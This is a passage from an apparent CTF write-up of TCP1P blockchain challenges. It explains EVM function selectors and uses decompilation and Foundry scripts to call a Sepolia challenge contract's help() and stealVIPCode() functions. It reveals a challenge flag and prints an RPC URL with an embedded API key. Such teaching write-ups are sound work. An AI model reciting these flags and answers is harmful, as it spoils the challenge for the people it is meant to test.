&lt;p&gt;Function names won&#x27;t be directly stores as it is in the bytecode. Only function selector of that particular function will be stored in bytecode.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;span style=&quot;color: green&quot;&gt;&lt;strong&gt;What is function selector?&lt;&#x2F;strong&gt;&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
&lt;p&gt;A function selector is a four-byte identifier determined through the Keccak256 hash of the function&#x27;s signature. The function signature is derived from the function name and the parenthesized list of parameter types. For example a function is defined as below :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sum&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint b&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public returns&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;....
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Function signature of sum() is &lt;code&gt;sum(uint,uint)&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Function selector of sum() is &lt;code&gt;bytes4(keccak256(bytes(&quot;sum(uint,uint)&quot;)))&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We can get the function selector using &lt;code&gt;cast&lt;&#x2F;code&gt; cli tool.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;invitation$&lt;&#x2F;span&gt;&lt;span&gt; cast sig &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;sum(uint,uint)&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0xcad0899b
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;As you can see only 4 bytes hex value is the function signature. This 4 bytes value only stored in the EVM bytecode.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;span style=&quot;color: green&quot;&gt;&lt;strong&gt;Which OP code operates this function signature?&lt;&#x2F;strong&gt;&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
&lt;p&gt;It is &lt;code&gt;PUSH4&lt;&#x2F;code&gt; as PUSH4 OP code used to push 4 bytes at a time into the stack. For the above example, the assembly will be &lt;strong&gt;&lt;code&gt;PUSH 0xcad0899b&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;We have got enough knowledge know lets solve the challenge&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;&lt;span style=&quot;color: green&quot;&gt;&lt;strong&gt;Decompile the EVM bytecode and find the function selector&lt;&#x2F;strong&gt;&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I am using &lt;code&gt;Dedaub&lt;&#x2F;code&gt; to decompile. Enter the Bytecode in online decompiler and continue to decompile the EVM bytecode and view the disassembled section for the OP Codes. Our aim is to find the function selector which is operated by &lt;code&gt;PUSH4&lt;&#x2F;code&gt; OP Code, so lets find PUSH4 in the OP Codes.As you can see in below image we found few function selectors.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;tcp1p23&#x2F;tcp1pctf23_invitation1.png&quot; class=&quot;autoimg&quot;&#x2F;&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Can we get back the original function name from function selector?&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Absolutely not, it is impossible to get the original function signature information back theatrically. But there is a way to find it. There is a database available which collects tons of function signatures and their hashes.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.4byte.directory&#x2F;&quot; target=_blank&gt;4byte.directory&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Search one by one function selectors that we found from the decompilation. &lt;code&gt;0xb00d78a5&lt;&#x2F;code&gt; is the one that we are looking.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;tcp1p23&#x2F;tcp1pctf23_invitation2.png&quot; class=&quot;autoimg&quot;&#x2F;&gt;
&lt;p&gt;Finally change the function name to flag format as specified in the 101.txt&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : TCP1P{4_Bytes_SigNAtuRe_aS_4n_Invitation_congratz}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;vip&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#vip&quot; aria-label=&quot;Anchor link for: vip&quot;&gt;VIP&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;strong&gt;Description :&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;A very simple system at a party. If you are a VIP, you can get everything.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Challenge : nc ctf.tcp1p.com 23345
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Lets connect to challenge,&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;vip$&lt;&#x2F;span&gt;&lt;span&gt; nc ctf.tcp1p.com 23345
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Welcome&lt;&#x2F;span&gt;&lt;span&gt; to TCP1P Blockchain Challenge
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1.&lt;&#x2F;span&gt;&lt;span&gt; How to 101&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;?
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;2.&lt;&#x2F;span&gt;&lt;span&gt; get Contract
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Same&lt;&#x2F;span&gt;&lt;span&gt; as the last challenge, but this time, call the help() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;first
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;mj0ln1r@AHLinux:~&#x2F;vip$ nc ctf.tcp1p.com 23345
&lt;&#x2F;span&gt;&lt;span&gt;Welcome to TCP1P Blockchain Challenge
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;1. How to 101?
&lt;&#x2F;span&gt;&lt;span&gt;2. get Contract
&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;gt; 2
&lt;&#x2F;span&gt;&lt;span&gt;Contract Addess: 0xCf2C346b07CE9931962fC8B6d93fF094FbF447B9
&lt;&#x2F;span&gt;&lt;span&gt;RPC URL        : https:&#x2F;&#x2F;eth-sepolia.g.alchemy.com&#x2F;v2&#x2F;SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
&lt;&#x2F;span&gt;&lt;span&gt;To start       : Simply call the help() function, everything is written there
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Note: Due it&amp;#39;s deployed on Sepolia network, please use your own Private key to do the transaction
&lt;&#x2F;span&gt;&lt;span&gt;      If you need funds, you can either DM the probset or get it on https:&#x2F;&#x2F;sepoliafaucet.com&#x2F;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Firstly get some Sepolia ETH if you dont have like me. Thank you &lt;strong&gt;@kiinzu(author)&lt;&#x2F;strong&gt; for the Sepolia ETH :-).&lt;&#x2F;p&gt;
&lt;p&gt;Initially I did this challenge by writing a contract on remix and called challenge contract from there. Now I will explain a much more easy way using &lt;code&gt;Foundry&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Setup Foundry&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;forge init&lt;&#x2F;code&gt; (to setup foundry project)&lt;&#x2F;li&gt;
&lt;li&gt;Delete boiler plate codes under (&#x2F;src, &#x2F;test, &#x2F;script)&lt;&#x2F;li&gt;
&lt;li&gt;Create a new file &lt;code&gt;Solve.s.sol&lt;&#x2F;code&gt; in &lt;code&gt;&#x2F;script&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Import Script and console to write scripts and logging.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;First of all as challenge 101 said, call the &lt;code&gt;help()&lt;&#x2F;code&gt; function. I used &lt;code&gt;call&lt;&#x2F;code&gt; method to call the help() function and decoded using &lt;code&gt;abi.decode&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;13&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; import &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Script} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract SolveVIP is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getHelp&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        address target &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;bytes memory _help) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;help()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(success)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;logBytes&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;(_help&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(bytes)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getHelp&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;If we run the script and decoded the output we will get some message to move forward in challenge.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;vip$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;Solve.s.sol&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url&lt;&#x2F;span&gt;&lt;span&gt; https:&#x2F;&#x2F;eth-sepolia.g.alchemy.com&#x2F;v2&#x2F;SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[‚†¢]&lt;&#x2F;span&gt;&lt;span&gt; Compiling...
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[‚†í]&lt;&#x2F;span&gt;&lt;span&gt; Compiling 15 files with 0.8.20
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[‚†¢]&lt;&#x2F;span&gt;&lt;span&gt; Solc 0.8.20 finished in 5.83s
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Compiler&lt;&#x2F;span&gt;&lt;span&gt; run successful!
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Script&lt;&#x2F;span&gt;&lt;span&gt; ran successfully.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Logs&lt;&#x2F;span&gt;&lt;span&gt; ==
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x57656c636f6d6520746f205443503150205072697661746520436c7562210a0a456e6a6f792074686520435446205061727479206f6620796f7572206c6966652068657265210a4275742066697273742e2e2e20506c656173652067697665206d6520796f75722069642c206e6f726d616c2070656f706c652068617665206174206c65617374206d656d62657220726f6c650a4f6620436f757273652c2074686572652061726520616c736f206d616e792056495073206f76657220686572652e20422d290a0a46756e6374696f6e733a0a0a456e7472616e636528726f6c6529202d3e2076657269667920796f757220726f6c6520686572652c2061726520796f752061206d656d626572206f722056495020436c6173730a2020203e20726f6c6520202d2d3e20696e70757420796f757220726f6c6520617320737472696e670a737465616c564950436f64652829202d3e20736f6d656f6e65206d69676874277665206a75737420737465616c20612076697020636f646520616e642077616e7420746f206769766520697420746f20796f750a676574466c616728292020202020202d3e204f6e636520796f752073686f7720796f757220726f6c652c20796f752063616e2074727920796f7572206c75636b21204f4e4c59205649502043616e206765742074686520466c6167210a0a0a
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;vip$&lt;&#x2F;span&gt;&lt;span&gt; python3
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Crypto.Util.number&lt;&#x2F;span&gt;&lt;span&gt; import long_to_bytes
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; long_to_bytes(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x57656c636f6d6520746f205443503150205072697661746520436c7562210a0a456e6a6f792074686520435446205061727479206f6620796f7572206c6966652068657265210a4275742066697273742e2e2e20506c656173652067697665206d6520796f75722069642c206e6f726d616c2070656f706c652068617665206174206c65617374206d656d62657220726f6c650a4f6620436f757273652c2074686572652061726520616c736f206d616e792056495073206f76657220686572652e20422d290a0a46756e6374696f6e733a0a0a456e7472616e636528726f6c6529202d3e2076657269667920796f757220726f6c6520686572652c2061726520796f752061206d656d626572206f722056495020436c6173730a2020203e20726f6c6520202d2d3e20696e70757420796f757220726f6c6520617320737472696e670a737465616c564950436f64652829202d3e20736f6d656f6e65206d69676874277665206a75737420737465616c20612076697020636f646520616e642077616e7420746f206769766520697420746f20796f750a676574466c616728292020202020202d3e204f6e636520796f752073686f7720796f757220726f6c652c20796f752063616e2074727920796f7572206c75636b21204f4e4c59205649502043616e206765742074686520466c6167210a0a0a&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Welcome to TCP1P Private Club!
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Enjoy the CTF Party of your life here!
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;But first... Please give me your id, normal people have at least member role
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Of Course, there are also many VIPs over here. B-)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Functions:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Entrance(role) -&amp;gt; verify your role here, are you a member or VIP Class
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;   &amp;gt; role  --&amp;gt; input your role as string
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;   stealVIPCode() -&amp;gt; someone might&amp;#39;ve just steal a vip code and want to give it to you
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;   getFlag()      -&amp;gt; Once you show your role, you can try your luck! ONLY VIP Can get the Flag!&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now we its clear that we need to call &lt;code&gt;stealVIPCode()&lt;&#x2F;code&gt; first then get the VIP Code and use it to call the &lt;code&gt;Entrance(role)&lt;&#x2F;code&gt; to solve the challenge. Finally calling the &lt;code&gt;getFlag()&lt;&#x2F;code&gt; will give us the flag.&lt;&#x2F;p&gt;
&lt;p&gt;Lets call &lt;code&gt;stealVIPCode()&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;13&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; import &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Script} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract SolveVIP is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;callStealVIPCode&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;            address target &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            (bool success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;bytes memory _vipCode) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;stealVIPCode()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(success)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;logBytes&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;(_vipCode&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;(bytes)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
